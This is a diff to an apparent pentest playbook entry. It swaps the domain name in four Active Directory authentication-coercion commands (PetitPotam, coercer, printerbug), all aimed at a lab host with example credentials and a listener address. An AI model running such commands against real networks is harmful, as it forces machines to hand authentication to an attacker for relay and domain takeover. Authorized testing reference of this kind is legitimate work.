@@ -15,10 +15,10 @@ commands:
   - have: Credentials
     cmd: |
       # Coerce (authenticated — more reliable)
-      python3 PetitPotam.py -u sec_user -p 'P@ssw0rd' -d senshu.sh 10.10.10.21 10.10.10.27
-      coercer scan -t 10.10.10.27 -u sec_user -p 'P@ssw0rd' -d senshu.sh
-      coercer coerce -t 10.10.10.27 -l 10.10.10.21 -u sec_user -p 'P@ssw0rd' -d senshu.sh
-      python3 printerbug.py senshu.sh/sec_user:'P@ssw0rd'@10.10.10.27 10.10.10.21
+      python3 PetitPotam.py -u sec_user -p 'P@ssw0rd' -d senshu.local 10.10.10.21 10.10.10.27
+      coercer scan -t 10.10.10.27 -u sec_user -p 'P@ssw0rd' -d senshu.local
+      coercer coerce -t 10.10.10.27 -l 10.10.10.21 -u sec_user -p 'P@ssw0rd' -d senshu.local
+      python3 printerbug.py senshu.local/sec_user:'P@ssw0rd'@10.10.10.27 10.10.10.21
 
 phase:
   - Exploitation
